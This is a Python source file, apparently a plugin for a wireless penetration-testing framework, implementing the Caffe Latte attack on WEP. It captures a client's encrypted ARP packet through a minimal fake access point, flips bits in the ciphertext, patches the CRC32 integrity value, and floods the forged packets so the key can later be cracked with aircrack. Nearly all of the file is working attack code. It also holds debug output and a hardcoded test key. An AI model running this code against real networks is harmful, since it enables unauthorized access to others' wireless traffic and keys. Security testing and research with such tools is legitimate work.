# -*- coding: utf-8 -*-
"""
This plugin will launch a full arp replay attack on a WEP network
You can then check the wep data log and launch aircrack on it.
"""
import os, time
from AuxiliaryModules.minwepap import MinimalWEP
from binascii import crc32
from plugin import AirScannerPlugin, AirInjectorPlugin
from random import randint
from struct import pack, unpack
from scapy.all import sniff, sendp, Dot11, Dot11WEP, conf, rdpcap
from subprocess import Popen
from threading import Thread, Lock
from utils.utils import DEVNULL

# Should be an AirHostPlugin but hostapd cannot send
# successfull auth responses to any credentials,
# that is why MinimalWEP had to be created
class CaffeLatte(AirScannerPlugin, AirInjectorPlugin):

    def __init__(self):
        super(CaffeLatte, self).__init__("caffelatte")
        self.sniffing_interface = self.config["sniffing_interface"]
        self.ap_ssid = self.config["ap_ssid"]
        self.ap_bssid = self.config["ap_bssid"]
        self.channel = int(self.config["fixed_sniffing_channel"])  # Because of global variables this is already checked by the airscanner
        self.wep_ap = MinimalWEP(self.ap_ssid, self.ap_bssid, self.channel, self.sniffing_interface)
        self.replay_attack_running = False

        self.original_arp_packet = None
        self.flipped_arp_packet = None

        self.n_captured_data_packets = 0
        self.n_arp_packets_sent = 0

    def identify_arp_packet(self, packet):
        return len(packet[Dot11WEP].wepdata) == 36 and \
            packet[Dot11].addr1 == self.ap_bssid and  \
            packet[Dot11].addr3 == "ff:ff:ff:ff:ff:ff"

    def flip_bits1(self, packet):
        wep_packet = str(packet[Dot11WEP])
        print "original wep content: ", list(wep_packet), " len: ", len(list(wep_packet)), "\n"
        wepdata = list(packet[Dot11WEP].wepdata)
        original_icv = packet[Dot11WEP].icv

        flipped_packet = packet.copy()
        # Create bitmask with same size as the encrypted wepdata
        bitmask = list('\x00' * len(wepdata))
        # Flip bits of the bitmask corresponding to the last byte of sender MAC and IP respectively
        bitmask[len(wepdata) - 11] = chr(randint(0, 255))
        bitmask[len(wepdata) - 15] = chr(randint(0, 255))
        print "bitmask: ", bitmask, "\n"
        # Create crc32 checksum for the bitmask, the logical AND with only Fs turns it into a unsigned crc32
        icv_patch = crc32("".join(bitmask)) & 0xffffffff
        print "icv_patch: ", icv_patch, "\n"
        # Now apply the 'patch' to the wepdata and the icv
        flipped_result = [ chr( ord(wepdata[i]) ^ ord(bitmask[i]) ) for i in range(len(wepdata)) ]
        patched_icv = icv_patch ^ original_icv
        print "flipped_result: ", flipped_result, " len: ", len(flipped_result), "\n"
        # Put the results back in the packet
        flipped_packet[Dot11WEP].wepdata = "".join(flipped_result)
        flipped_packet[Dot11WEP].icv = patched_icv
        # Now lets change the 802.11 information header a bit
        flipped_packet[Dot11].addr1 = "ff:ff:ff:ff:ff:ff"
        flipped_packet[Dot11].addr3 = (packet[Dot11].addr2[:-2] + "%02x") % randint(0, 255)
        flipped_packet[Dot11].addr2 = self.ap_bssid

        return flipped_packet

    def flip_bits2(self, packet):
        wep_packet = str(packet[Dot11WEP])
        print "original wep content: ", list(wep_packet), " len: ", len(list(wep_packet)), "\n"
        print "original wepdata: ", list(wep_packet[4:-4]), " len: ", len(list(wep_packet)), "\n"
        wepdata = list(wep_packet)[4:-4]
        original_icv = list(wep_packet)[-4:]

        flipped_packet = packet.copy()
        # Create bitmask with same size as the encrypted wepdata
        bitmask = list('\x00' * len(wepdata))
        # Flip bits of the bitmask corresponding to the last byte of sender MAC and IP respectively
        print len(wepdata), "-", 11, "=", len(wepdata) - 11
        bitmask[len(wepdata) - 11] = chr(randint(0, 255))
        bitmask[len(wepdata) - 15] = chr(randint(0, 255))
        print "bitmask: ", bitmask, "\n"
        # Create crc32 checksum for the bitmask, the logical AND with only Fs turns it into a unsigned crc32
        icv_patch = crc32("".join(bitmask)) & 0xffffffff
        icv_patch_bytes = pack(">I", icv_patch)
        final_bitmask = bitmask + list(icv_patch_bytes)
        print "icv_patch: ", icv_patch, "\n"
        print "icv_patch_bytes: ", list(icv_patch_bytes), "\n"
        print "final_bitmask: ", final_bitmask, " len: ", len(final_bitmask), "\n"
        # Now apply the 'patch' to the wepdata and the icv
        original_data = wepdata + original_icv
        flipped_result = [ chr( ord(original_data[i]) ^ ord(final_bitmask[i]) ) for i in range(len(original_data)) ]
        final_result = str(packet)[:4] + "".join(flipped_result)
        print "flipped_result: ", flipped_result, " len: ", len(flipped_result), "\n"
        # Put the results back in the packet
        """
        dot11wep = Dot11WEP()
        dot11wep.iv = packet.iv
        dot11wep.keyid = 0
        dot11wep.icv = unpack(">I", "".join(flipped_result[-4:]))[0]
        dot11wep.wepdata = "".join(flipped_result[:-4])
        flipped_packet[Dot11WEP] = dot11wep
        """
        flipped_packet[Dot11WEP] = Dot11WEP(final_result)
        # Now lets change the 802.11 information header a bit
        flipped_packet[Dot11].addr1 = "ff:ff:ff:ff:ff:ff"
        flipped_packet[Dot11].addr3 = (packet[Dot11].addr2[:-2] + "%02x") % randint(0, 255)
        flipped_packet[Dot11].addr2 = self.ap_bssid

        return flipped_packet

    def replay_attack(self):
        socket = conf.L2socket(iface = self.sniffing_interface)
        flipped_packets = []
        for i in range(3):
            flipped_packets.append(self.flip_bits1(self.original_arp_packet))
            flipped_packets[i][Dot11WEP].show()
            print flipped_packets[i].command()
            print "\n"

        while self.replay_attack_running:
            # Always create fresh new packets
            try:
                socket.send(flipped_packets[0])
                socket.send(flipped_packets[1])
                socket.send(flipped_packets[2])
            except: pass  # No buffer space available.. skip and keep sending

        print "[+] Stopped replay attack from last ARP packet."
        self.replay_attack_running = False
        socket.close()

    def pre_scanning(self):
        self.wep_ap.start()

    def handle_packet(self, packet):
        if not self.replay_attack_running:
            self.wep_ap.respond_to_packet(packet)
            if Dot11WEP in packet:
                if self.identify_arp_packet(packet):
                    packet2 = packet.copy()
                    print packet2.command()
                    packet2[Dot11WEP].decrypt(key="\x31\x32\x33\x34\x35")
                    packet2.show()
                    print packet2.command()
                    print "[+] Found a Gratuitous ARP packet"
                    self.original_arp_packet = packet
                    self.replay_attack_running = True
                    print "[+] Flipping last bytes of Source MAC and IP"
                    self.flipped_packet = self.flip_bits1(packet.copy())
                    print "[+] Starting replay attack"
                    Thread(target=self.replay_attack).start()

                    tmp = self.flipped_packet
                    tmp[Dot11WEP].decrypt(key="\x31\x32\x33\x34\x35")
                    tmp.show()


    def post_scanning(self):
        self.wep_ap.shutdown()
